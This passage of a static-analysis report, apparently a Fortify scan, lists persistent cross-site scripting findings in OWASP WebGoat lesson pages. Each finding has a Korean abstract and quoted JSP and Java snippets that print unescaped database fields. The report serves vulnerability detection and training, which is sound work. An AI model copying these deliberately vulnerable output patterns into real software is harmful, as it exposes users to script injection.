<Snippet>						EmployeeStub stub = (EmployeeStub) i.next();
					%&gt;
			      	&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName() + " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;
					&lt;%}%&gt;
	                &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="29FA0C17BEF5FF0EECE749D6CC6B14E8" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.jsp의 _jspService() 메서드가 24 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ListStaff.jsp</FilePath>
<LineStart>24</LineStart>
<Snippet>					{
						EmployeeStub stub = (EmployeeStub) i.next();%&gt;
						&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()+ " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;&lt;%
					}%&gt;
  &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="11C5322951776CCB3FD8A8E5BD444E0A" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 34 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>34</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.ADDRESS2%&gt;" type="text" value="&lt;%=employee.getAddress2()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="14AAC1B1B8E9D78926B542D8573E917A" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/Login.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>						EmployeeStub stub = (EmployeeStub) i.next();
					%&gt;
			      	&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName() + " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;
					&lt;%}%&gt;
	                &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="612D26EEDB91F215F685C0AE20B65874" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.FIRST_NAME%&gt;" type="text" value="&lt;%=employee.getFirstName()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0C6A8600A55BA1FCA5A37500B489FBB8" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;%=employee.getLastName()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>194</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7FDDE0452CDCD7903DAEC7C497A4FC74" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;%=employee.getLastName()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="DF932E7B139FD46755E405EEC44E6365" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 24 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>24</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;%=employee.getLastName()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="192B68B1821E6AF48BF4FC96BBAED8F8" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 126 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>126</LineStart>
<Snippet>                       	&lt;td width="81"&gt;
 							&lt;input name="&lt;%=RoleBasedAccessControl.EMPLOYEE_ID%&gt;" type="hidden" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input name="&lt;%=RoleBasedAccessControl.TITLE%&gt;" type="hidden" value="&lt;%=employee.getTitle()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=RoleBasedAccessControl.UPDATEPROFILE_ACTION%&gt;"/&gt;
						&lt;/td&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="FA0C53FF1C1BBC6A86841D86F9B4DBB2" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/Login.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>						EmployeeStub stub = (EmployeeStub) i.next();
					%&gt;
			      	&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName() + " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;
					&lt;%}%&gt;
	                &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>194</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="223F67B393DF2497C2502F7B8E5E958D" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.FIRST_NAME%&gt;" type="text" value="&lt;%=employee.getFirstName()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="24997C2A10F10982E43A8D38BEDE5E8C" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 29 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>29</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.ADDRESS1%&gt;" type="text" value="&lt;%=employee.getAddress1()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8E065DC585A3A5CA26E3FF1E99E357C0" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 80 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>80</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.DESCRIPTION%&gt;" type="text" value="&lt;%=employee.getPersonalDescription()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C7D1885BFCFDB8AF02A9EC182CAD4EC2" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 21 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>21</LineStart>
<Snippet>						Last Name:					&lt;/TD&gt;
					&lt;TD width="196"&gt;
					 	&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.LAST_NAME%&gt;" type="text" value="&lt;%=employee.getLastName()%&gt;"/&gt;
				  &lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6F589180AD7C754FF1C9531C79EF3F9B" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 126 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>126</LineStart>
<Snippet>                       	&lt;td width="81"&gt;
 							&lt;input name="&lt;%=RoleBasedAccessControl.EMPLOYEE_ID%&gt;" type="hidden" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input name="&lt;%=RoleBasedAccessControl.TITLE%&gt;" type="hidden" value="&lt;%=employee.getTitle()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=RoleBasedAccessControl.UPDATEPROFILE_ACTION%&gt;"/&gt;
						&lt;/td&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="91C133EC39D8893424B7C99EA7D728AC" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.LAST_NAME%&gt;" type="text" value="&lt;%=employee.getLastName()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8CBBB540197205D3AC2947F5C07658B1" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/Login.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>						EmployeeStub stub = (EmployeeStub) i.next();
					%&gt;
			      	&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName() + " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;
					&lt;%}%&gt;
	                &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F6C233737972A339A675B73AD4087C1D" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 29 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>29</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.ADDRESS1%&gt;" type="text" value="&lt;%=employee.getAddress1()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="14212F9080D138E1148B7DCCF36B7041" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ListStaff.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>					{
						EmployeeStub stub = (EmployeeStub) i.next();%&gt;
						&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()+ " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;&lt;%
					}%&gt;
  &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="02BB53BF75FDBB89E45DEA4478EA0164" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.jsp의 _jspService() 메서드가 24 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ListStaff.jsp</FilePath>
<LineStart>24</LineStart>
<Snippet>					{
						EmployeeStub stub = (EmployeeStub) i.next();%&gt;
						&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()+ " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;&lt;%
					}%&gt;
  &lt;/select&gt;</Snippet>
